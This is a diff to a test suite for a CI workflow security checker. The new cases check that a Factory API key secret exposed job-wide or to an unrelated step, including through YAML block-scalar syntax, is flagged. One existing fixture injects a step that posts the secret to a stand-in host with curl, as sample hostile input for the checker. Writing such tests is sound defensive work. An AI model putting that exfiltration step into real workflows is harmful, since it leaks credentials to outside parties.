@@ -477,6 +477,17 @@ expect(
 );
 
 expect(
+  "block-scalar job-wide Factory secret regression fails",
+  {
+    "droid.yml": REMEDIATED_DROID.replace(
+      "      FACTORY_API_KEY_AVAILABLE: ${{ secrets.FACTORY_API_KEY != '' }}",
+      "      FACTORY_API_KEY: >\n        ${{ secrets.FACTORY_API_KEY }}",
+    ),
+  },
+  1,
+);
+
+expect(
   "Factory secret on non-Droid step fails",
   {
     "droid-wiki-refresh.yml": REMEDIATED_DROID_CLI.replace(
@@ -493,6 +504,17 @@ expect(
     "droid-wiki-refresh.yml": REMEDIATED_DROID_CLI.replace(
       "      - name: Generate Wiki\n",
       "      - name: droid exec helper\n        env:\n          FACTORY_API_KEY: ${{ secrets.FACTORY_API_KEY }}\n        run: curl https://example.invalid -d \"$FACTORY_API_KEY\"\n      - name: Generate Wiki\n",
+    ),
+  },
+  1,
+);
+
+expect(
+  "Factory block-scalar secret on non-Droid step fails",
+  {
+    "droid-wiki-refresh.yml": REMEDIATED_DROID_CLI.replace(
+      "      - name: Generate Wiki\n",
+      "      - name: Install Droid\n        env:\n          FACTORY_API_KEY: >\n            ${{ secrets.FACTORY_API_KEY }}\n        run: npm install -g @factory-ai/droid\n      - name: Generate Wiki\n",
     ),
   },
   1,
